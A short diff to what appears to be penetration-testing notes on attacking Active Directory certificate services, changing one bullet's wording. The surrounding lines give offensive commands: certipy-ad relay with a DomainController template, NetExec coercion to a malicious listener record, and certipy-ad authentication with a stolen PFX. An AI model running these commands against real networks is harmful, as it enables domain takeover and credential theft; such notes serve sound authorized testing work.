@@ -39,7 +39,7 @@ certipy-ad relay -target 'web enrollment link' -template DomainController -subje
 ```bash
 nxc smb [hostname] -u [user] -p [pass] -k -M coerce_plus -o LISTENER=[malicious A Record] METHOD=[Method]
 ```
-- Certipy Auth to get PFX
+- Certipy Auth to with PFX to get CCACHE
 ```bash
 certipy-ad auth -pfx [file] -dc-ip [dc ip]
 ```
